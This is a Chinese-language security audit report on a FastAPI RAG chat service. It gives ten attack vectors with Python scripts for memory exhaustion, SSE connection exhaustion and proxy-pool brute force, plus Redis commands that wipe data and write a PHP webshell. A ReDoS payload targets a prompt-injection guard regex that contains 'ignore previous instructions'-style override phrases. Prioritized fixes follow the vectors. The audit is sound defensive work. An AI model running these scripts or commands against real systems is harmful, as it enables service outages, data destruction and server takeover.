## 攻击向量分析

### 向量 1: 会话内存炸弹

**入口点：** `POST /api/chat/sessions`

**利用方式：**
```python
# 攻击脚本：创建无限会话
import requests
for i in range(100000):
    requests.post("http://target:8080/api/chat/sessions", 
                  json={"title": f"bomb_{i}"}, 
                  headers={"Authorization": "Bearer <valid_token>"})
```

**攻击原理：**
- `_sessions_store` 是纯内存字典，无容量上限
- `_messages_store` 同理，每个会话的消息列表无限制
- 创建 10 万个会话，每个含 50 条消息（上限），每条消息 4000 字符（上限）→ 约 **20GB 内存**
- SQLite 持久化写入虽有，但内存缓存永不淘汰

**预期影响：** 服务 OOM 崩溃，所有用户不可用

---

### 向量 2: Token 黑名单内存泄漏

**入口点：** `POST /api/auth/login` + `POST /api/auth/logout`

**利用方式：**
```python
# 攻击脚本：持续登录/登出膨胀黑名单
for i in range(100000):
    # 登录获取 token
    resp = requests.post("http://target:8080/api/auth/login", json={...})
    token = resp.json()["token"]
    # 登出触发黑名单写入
    requests.post("http://target:8080/api/auth/logout", 
                  headers={"Authorization": f"Bearer {token}"})
```

**攻击原理：**
- `_token_blacklist` 字典存储 JTI → expiry 映射
- `_cleanup_blacklist()` 仅在写入时触发，清理过期条目
- 但 `token_versions` 字典（username → version）**永不清理**
- 攻击者用不同用户名登录，`token_versions` 无限增长

**预期影响：** 持续内存泄漏，最终 OOM

---

### 向量 3: 限流器内存泄漏

**入口点：** 任意 `/api/` 端点

**利用方式：**
```python
# 使用不同 IP 发送请求（代理池/Tor）
for ip in proxy_pool:
    requests.get(f"http://target:8080/api/search?q=test", 
                 headers={"X-Forwarded-For": ip})
```

**攻击原理：**
- `InputLimitMiddleware._limiters` 字典按 `global:{ip}` 或 `strict:{path}` 为 key
- `_get_limiter()` 只创建不清理
- 虽然 `rate_limiter.py` 有 `_cleanup_expired_limiters()`，但 InputLimitMiddleware **未调用它**
- 10 万个不同 IP → 10 万个 SlidingWindowRateLimiter 实例

**预期影响：** 内存缓慢泄漏，长期运行后 OOM

---

### 向量 4: Prompt Injection ReDoS

**入口点：** `POST /api/upload`（文档净化）或 `POST /api/chat`（查询净化）

**利用方式：**
```python
# 构造触发 ReDoS 的 payload
# prompt_guard.py 的正则: r'(?i)\b(?:ignore|disregard|forget|override)\b.{0,30}\b(?:previous|above|all|prior|earlier|system)\b.{0,20}\b(?:instructions?|prompts?|rules?|directives?|constraints?|context)\b'
# 攻击: 构造 "ignore" + 30个字符 + "previous" + 20个字符 + 但不匹配最后的词
payload = "ignore " + "a" * 30 + " previous " + "b" * 20 + " instruc"  # 不完整匹配
# 大量重复此模式，触发正则回溯
```

**攻击原理：**
- `prompt_guard.py` 中的 `_INJECTION_CRITICAL` 正则使用 `.{0,30}` 等贪婪匹配
- 特别是 `r'(?i)\b(?:ignore|disregard|forget|override)\b.{0,30}\b(?:previous|above|all|prior|earlier|system)\b.{0,20}\b(?:instructions?|prompts?|rules?|directives?|constraints?|context)\b'`
- 当输入部分匹配但最终失败时，正则引擎需要回溯大量可能性
- 输入长度为 N 时，回溯复杂度可达 O(2^N)

**预期影响：** 单个请求消耗 100% CPU 持续数分钟

### 向量 5: SSE 连接耗尽

**入口点：** `POST /api/chat/send` (stream=true)

**利用方式：**
```python
# 攻击脚本：打开大量 SSE 连接但不读取数据
import socket
for i in range(1000):
    s = socket.socket()
    s.connect(("target", 8080))
    s.send(b"POST /api/chat/send HTTP/1.1\r\nHost: target\r\n")
    s.send(b"Content-Type: application/json\r\n")
    s.send(b"Authorization: Bearer <token>\r\n")
    s.send(b'{"query":"test","stream":true}\r\n\r\n')
    # 不读取响应，保持连接
```

**攻击原理：**
- SSE 流式响应使用 `StreamingResponse`，逐字符输出 + 10ms sleep
- 4000 字符的回答 → 40 秒的连接占用
- 无连接超时设置（FastAPI 默认无 SSE 超时）
- 无单用户并发 SSE 连接数限制
- 1000 个并发 SSE 连接 × 40 秒 = 40000 秒的服务器资源占用

**预期影响：** 服务器连接池耗尽，新请求无法建立连接

### 向量 6: 文件上传内存炸弹

**入口点：** `POST /api/upload`

**利用方式：**
```python
# 上传 200MB 文件（配置上限）
import requests
# 构造 200MB 的垃圾数据
data = b"A" * (200 * 1024 * 1024)
requests.post("http://target:8080/api/upload",
              files={"file": ("large.txt", data)},
              headers={"Authorization": "Bearer <token>"})
```

**攻击原理：**
- `content = await file.read()` 一次性将整个文件读入内存
- 配置上限 `MAX_FILE_MB=200`，但检查发生在**读取之后**
- 实际上，`UploadFile` 的 Starlette 实现会先写临时文件，但 `file.read()` 仍会加载到内存
- 并发上传多个大文件 → 内存快速膨胀

**预期影响：** 单次请求占用 200MB+ 内存，并发 10 个 = 2GB

### 向量 7: Redis 无认证攻击

**入口点：** Redis 服务（端口 6379）

**利用方式：**
```bash
# docker-compose.yml 中 Redis 无密码
# 如果攻击者能访问内网
redis-cli -h target -p 6379
> FLUSHALL          # 清空所有数据
> CONFIG SET dir /tmp
> CONFIG SET dbfilename shell.php
> SET payload "<?php system($_GET['cmd']); ?>"
> SAVE              # 写入 webshell
```

**攻击原理：**
- `docker-compose.yml` 中 Redis 配置：`redis-server --appendonly yes --maxmemory 256mb --maxmemory-policy allkeys-lru`
- 无 `--requirepass` 参数
- `.env` 中 `REDIS_PASSWORD=` 为空
- 内网攻击者可直接连接 Redis 执行任意命令

**预期影响：** 数据清空、潜在 RCE（如果 Redis 可写文件到Web目录）

### 向量 8: 登录暴力破解（分布式绕过）

**入口点：** `POST /api/auth/login`

**利用方式：**
```python
# 使用代理池绕过 IP 限流
import requests
proxies = load_proxy_pool()  # 1000+ 代理
for password in password_list:
    proxy = next(proxies)
    resp = requests.post("http://target:8080/api/auth/login",
                        json={"username": "admin", "password": password},
                        proxies={"http": proxy})
    if resp.status_code == 200:
        print(f"Found: {password}")
```

**攻击原理：**
- 登录限流基于 IP（`_check_login_rate(ip)`）
- 账号锁定机制 `_MAX_ACCOUNT_ATTEMPTS=5`，锁定 15 分钟
- 但攻击者可使用分布式代理池，每个 IP 仅尝试 1 次
- 1000 个代理 × 每个 1 次 = 1000 次尝试/轮
- 每 15 分钟重置一轮 → 每天 96000 次尝试

**预期影响：** 弱密码账户被暴力破解

### 向量 9: 供应链版本范围攻击

**入口点：** `requirements.txt`

**利用方式：**
```
# requirements.txt 使用 >= 范围
fastapi>=0.139.0,<1.0.0
chromadb>=0.4.0,<1.0.0
jieba>=0.42.1,<1.0.0
# 攻击者在 PyPI 发布同名恶意包的兼容版本
```

**攻击原理：**
- 依赖声明使用范围约束（`>=`）而非精确锁定（`==`）
- 如果上游包被劫持（如 chromadb、jieba），发布 0.4.x 恶意版本
- `pip install` 会自动升级到恶意版本
- 特别危险：`sentence_transformers>=3.1.0`（ML 模型包，执行任意代码）

**预期影响：** 恶意代码在服务器执行

### 向量 10: 并发死锁场景

**入口点：** 管理员操作 + 用户操作并发

**利用方式：**
```python
# 并发触发
import threading
# 线程1: 管理员创建用户（获取 _users_file_lock）
threading.Thread(target=admin_create_user).start()
# 线程2: 用户操作触发会话保存（获取 _sessions_lock）
threading.Thread(target=chat_send_with_session).start()
# 如果内部调用链交叉获取锁 → 死锁
```

**攻击原理：**
- `_users_file_lock`（admin.py）和 `_sessions_lock`（chat.py）是独立锁
- 但 `admin_create_user` 内部调用 `log_audit()` → `_connect()` → 可能触发 WAL checkpoint
- WAL checkpoint 线程可能持有其他 SQLite 连接
- 如果此时 chat 路径也在等待 SQLite 连接 → 死锁

**预期影响：** 服务挂起，所有请求超时

## 防御建议

### P0 资源耗尽 — 必须立即修复

| # | 问题 | 修复方案 | 优先级 |
|---|------|---------|--------|
| 1 | 会话缓存无上限 | 实现 LRU 淘汰策略，限制每个用户最多 100 个会话，全局最多 10000 个 | P0 |
| 2 | 消息缓存无上限 | 每个会话最多保留 200 条消息，超出部分仅存 SQLite | P0 |
| 3 | Token 黑名单泄漏 | 为 `_token_blacklist` 和 `token_versions` 设置容量上限（如 10000），使用 LRU 淘汰 | P0 |
| 4 | 限流器不清理 | 在 `InputLimitMiddleware` 中定期调用清理逻辑，或使用 TTL 字典 | P0 |
| 5 | ReDoS 正则 | 对所有 `.{0,N}` 模式添加超时限制（`regex` 库的 `timeout` 参数），或简化正则为非回溯版本 | P0 |
| 6 | SQLite 连接泄漏 | 限制连接池最大连接数为 5，添加连接空闲超时回收（30秒） | P0 |
| 7 | 审计日志膨胀 | 实现日志轮转（按大小 50MB + 按时间 30 天），定期清理 | P0 |
| 18 | Redis 消费者无上限 | 限制并发消费者数量，添加任务积压告警 | P0 |
| 19 | 文件上传内存炸弹 | 在 `file.read()` 前检查文件大小（`file.size`），超限直接拒绝 | P0 |

### P1 拒绝服务 — 一周内修复

| # | 问题 | 修复方案 | 优先级 |
|---|------|---------|--------|
| 8 | SSE 无超时 | 添加 SSE 连接超时（如 60 秒），限制每用户并发 SSE 连接数（如 3 个） | P1 |
| 9 | LLM 缓存无限制 | 使用 `functools.lru_cache` 或实现 TTL 缓存，限制最大条目 1000 | P1 |
| 10 | 死锁风险 | 统一锁获取顺序，避免嵌套锁；或使用 `asyncio.Lock` 替代 `threading.Lock` | P1 |
| 11 | 僵尸线程 | 实现优雅停机（`shutdown` 事件中停止所有后台线程），使用 `threading.Event` 控制循环 | P1 |
| 20 | 分布式登录绕过 | 添加账号维度限流（已部分实现），结合设备指纹或 CAPTCHA | P1 |

### P2 供应链 — 两周内修复

| # | 问题 | 修复方案 | 优先级 |
|---|------|---------|--------|
| 12 | .env 明文密钥 | 使用 Docker Secrets 或环境变量注入，禁止 `.env` 文件进入镜像 | P2 |
| 13 | Redis 无密码 | 添加 `--requirepass`，在 `.env` 中设置强密码 | P2 |
| 14 | 依赖版本范围 | 生成 `requirements.lock`（`pip freeze`），CI/CD 中使用 `--require-hashes` | P2 |

### P3 数据安全 — 一个月内修复

| # | 问题 | 修复方案 | 优先级 |
|---|------|---------|--------|
| 15 | 开发模式错误泄露 | 确保生产环境 `FUXI_ENV=production`，CI 中验证 | P3 |
| 16 | 日志敏感信息 | 对日志中的用户查询应用脱敏（`SENSITIVE_PATTERNS`），日志级别调整 | P3 |
| 17 | 备份文件访问 | 备份目录添加 `.htaccess` 或 Nginx 访问控制，备份文件加密 | P3 |

### 最危险的攻击链

**攻击链 1: 内存炸弹 → 服务崩溃**
```
创建无限会话 → 填充消息缓存 → 频繁登录膨胀黑名单 → OOM → 全平台不可用
```

**攻击链 2: ReDoS + SSE 连接耗尽**
```
上传包含 ReDoS payload 的文档 → 消耗 CPU → 同时打开大量 SSE 连接 → 服务完全不可用
```

**攻击链 3: Redis 未授权 → 数据清空**
```
内网渗透 → 连接无密码 Redis → FLUSHALL → 清空任务队列 → 数据丢失
```

## 检测方法说明

本次检测采用**白盒静态代码审计**，覆盖以下模块：

- `src/server.py` — 应用入口与生命周期
- `src/middleware.py` — 认证、限流、CORS、安全头
- `src/config.py` — 全局配置与密钥管理
- `src/api/auth.py` — JWT 认证与 Token 管理
- `src/api/auth_routes.py` — 登录/注册/登出路由
- `src/api/chat.py` — 对话与会话管理
- `src/api/documents.py` — 文档上传与管理
- `src/api/rag.py` — RAG 检索
- `src/api/search.py` — 搜索端点
- `src/api/admin.py` — 管理路由
- `src/api/wiki.py` — Wiki 路由
- `src/data_service.py` — 数据访问层
- `src/infra/rate_limiter.py` — 速率限制器
- `src/infra/connection_pool.py` — 连接池
- `src/infra/task_queue.py` — 任务队列
- `src/infra/backup.py` — 备份模块
- `src/infra/concurrency.py` — 并发控制
- `src/infra/health_check.py` — 健康检查
- `src/services/prompt_guard.py` — Prompt 注入防御
- `src/services/llm.py` — LLM 调用链
- `src/services/retrieval.py` — 检索服务
- `src/services/coreference_resolver.py` — 指代消解
- `docker-compose.yml` — 容器编排配置
- `.env` — 环境变量配置
- `requirements.txt` — 依赖声明

**未覆盖（需要运行时测试）：**
- 实际网络延迟与连接行为
- ChromaDB 向量库的实际性能瓶颈
- Redis Stream 的实际吞吐量极限
- LLM API 的超时与降级行为
